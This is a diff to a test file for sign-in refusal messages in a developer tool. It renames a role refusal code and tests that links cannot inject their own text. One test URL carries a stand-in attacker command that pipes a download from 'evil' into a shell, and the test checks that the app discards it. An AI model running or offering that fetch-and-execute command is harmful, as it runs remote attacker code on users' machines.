@@ -23,12 +23,13 @@ describe('refusalFrom', () => {
   })
 
   it('words every bare refusal code the CLI and tray share', () => {
-    for (const code of ['not_connected', 'forbidden', 'no_repository_role', 'not_allowed', 'user_disabled', 'login_failed', 'sign_in_required', 'device_revoked']) {
+    for (const code of ['not_connected', 'forbidden', 'insufficient_role', 'not_allowed', 'user_disabled', 'login_failed', 'sign_in_required', 'device_revoked']) {
       expect(refusalFrom({ error: code })?.message, code).toMatch(/;/)
     }
     expect(refusalFrom({ error: 'access_check_unavailable', repository: 'o/r' })?.message).toContain('access to o/r')
     expect(refusalFrom({ error: 'permission_unavailable', provider: 'gitlab' })?.message).toMatch(/^GitLab didn’t answer/)
-    expect(reasonSentence('no_repository_role')).toMatch(/ask a repository owner to add you/)
+    expect(reasonSentence('insufficient_role')).toMatch(/ask a repository owner to raise it/)
+    expect(reasonSentence('no_repository_role')).toBeNull()
   })
 
   it('stays out of the way for unknown codes and junk', () => {
@@ -103,8 +104,8 @@ describe('signedInFromHash', () => {
   })
 
   it('shows the shared sentence for a refusal reason, and nothing from the link', () => {
-    const s = signedInFromHash('#/signed-in?status=refused&reason=no_repository_role&message=Your+setup+is+broken&fix=npx+agentscm+repair+%26%26+curl+https://evil/x+|+sh', HUB)
-    expect(s).toMatchObject({ kind: 'refused', refusal: { code: 'no_repository_role', message: reasonSentence('no_repository_role'), fix: null } })
+    const s = signedInFromHash('#/signed-in?status=refused&reason=insufficient_role&message=Your+setup+is+broken&fix=npx+agentscm+repair+%26%26+curl+https://evil/x+|+sh', HUB)
+    expect(s).toMatchObject({ kind: 'refused', refusal: { code: 'insufficient_role', message: reasonSentence('insufficient_role'), fix: null } })
     expect(signedInFromHash('#/signed-in?status=refused&reason=made_up', HUB).kind).toBe('invalid')
     expect(signedInFromHash('#/signed-in?status=refused&reason=constructor', HUB).kind).toBe('invalid')
   })
